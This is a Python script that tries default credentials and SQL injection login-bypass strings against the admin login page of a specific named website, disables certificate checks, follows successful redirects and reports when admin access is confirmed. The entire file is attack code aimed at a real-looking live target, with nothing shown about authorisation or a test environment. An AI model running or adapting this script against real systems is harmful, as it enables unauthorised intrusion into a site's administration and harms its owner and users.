import requests

def main():
    print('Testing Admin Login for SQLi / Default Creds...')
    url = 'https://iran.fruitcraft.ir/admin/login'
    
    payloads = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('root', 'root'),
        ("admin' OR '1'='1", "admin"),
        ("admin' --", "admin"),
        ("admin'#", "admin"),
        ("' OR 1=1 --", "123")
    ]
    
    for user, pwd in payloads:
        data = {'username': user, 'password': pwd}
        res = requests.post(url, data=data, verify=False, allow_redirects=False)
        
        if res.status_code == 302:
            print(f'[!] Possible success with {user}:{pwd} (Redirected to {res.headers.get("Location")})')
            # Let's follow it
            res2 = requests.get('https://iran.fruitcraft.ir' + res.headers.get('Location', ''), cookies=res.cookies, verify=False)
            if 'Fruit Admin' in res2.text or 'Dashboard' in res2.text or 'logout' in res2.text:
                print('    -> Confirmed Admin Access!')
            else:
                print('    -> False positive / Redirect to login')
        else:
            print(f'[-] Failed {user}:{pwd} (HTTP {res.status_code})')

if __name__ == '__main__':
    main()
